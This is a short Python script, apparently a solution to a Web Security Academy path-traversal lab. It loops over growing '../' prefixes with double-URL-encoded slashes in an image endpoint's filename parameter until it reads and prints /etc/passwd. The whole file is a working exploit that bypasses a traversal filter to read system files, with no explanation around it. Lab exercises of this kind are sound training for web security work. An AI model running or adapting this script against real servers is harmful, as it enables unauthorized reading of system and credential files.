import requests
import urllib.parse

url = "https://ac331f6f1ee6ddc3c0db7c5a00e20053.web-security-academy.net/image"

payload = "etc/passwd"

def double_encode(p):
	encode = []
	for i in p:
		if i == '/':
			i = r"%252f"
		encode.append(i)
	return ''.join(encode)
p = ''
while True:
	p = double_encode(p)
	print(p + payload)
	r = requests.get(url , params={"filename": p+payload})
	if "No such file" not in r.text:
		print(r.text)
		break
	else:
		p = p + "../"
